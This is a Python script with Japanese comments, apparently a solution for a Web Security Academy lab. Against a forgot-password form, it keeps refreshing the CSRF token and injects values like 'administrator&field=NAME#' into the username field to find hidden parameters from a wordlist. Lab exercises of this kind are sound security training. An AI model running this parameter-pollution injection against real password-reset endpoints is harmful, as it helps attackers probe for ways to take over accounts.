from pathlib import Path

import requests
from bs4 import BeautifulSoup


# パスワードリセットフォームに対し、追加パラメータとして受け付けられる
# 隠しフィールド名を辞書ベースで列挙するスクリプト
ROOT = Path(__file__).resolve().parent.parent
FIELD_LIST_FILE = ROOT / "wordlists" / "field_list.txt"

url = 'https://0a6300e1047a437282a865e5002d0020.web-security-academy.net/forgot-password'
session = requests.Session()

res = session.get(url)
soup = BeautifulSoup(res.text, 'html.parser')

# フォーム内の CSRF トークンを取得
csrf_input = soup.find('input', {'name': 'csrf'})
if csrf_input is None:
    print('[!] csrf input が見つかりません。フォーム内の input を一覧表示します:')
    for i in soup.find_all('input'):
        print(' ', i)
    exit(1)

csrf = csrf_input['value']
print(f'[*] CSRF token: {csrf}')

with open(FIELD_LIST_FILE, 'r') as f:
    fields = f.read().splitlines()

# 無効なフィールド名を投げた際のレスポンスをベースラインとして保持する
baseline = session.post(url, data={
    'csrf': csrf,
    'username': 'administrator&field=invalid_baseline_field#',
})
baseline_len = len(baseline.text)

for field in fields:
    # CSRF トークンはリクエストごとに更新されるため再取得する
    res = session.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']

    data = {
        'csrf': csrf,
        'username': f'administrator&field={field}#'
    }

    res = session.post(url, data=data)
    # ベースラインとの差分が出たフィールドを候補として報告する
    if len(res.text) != baseline_len or res.status_code != baseline.status_code:
        print(f'[+] 応答に差分あり field: {field!r}')
        print(f'    status: {res.status_code}, len: {len(res.text)} (baseline: {baseline_len})')
    else:
        print(f'[-] {field}')
